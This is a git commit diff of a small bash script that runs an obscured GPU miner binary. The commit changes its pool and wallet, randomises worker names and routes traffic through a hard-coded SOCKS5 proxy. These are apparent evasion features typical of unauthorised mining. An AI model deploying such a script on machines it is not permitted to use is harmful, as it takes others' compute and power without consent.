d1c03f8a455f4176a5dbbe574a5337855d9d1bca
robbyezhaa <69030301+robbyezhaa@users.noreply.github.com>
2021-07-26 18:03:02 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,7 +1,8 @@
 #!/bin/bash
-POOL=daggerhashimoto.eu-west.nicehash.com:3353
-WALLET=3Aq3J5Jc1guWUzLAEfQcWivw7tdBTARCG9
+POOL=ethash.poolbinance.com:1800
+WALLET=robb002
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-NICE)
+SOCKS5=104.237.228.152:1080
 
 chmod +x lol
-./lol --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./lol --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY $SOCKS5
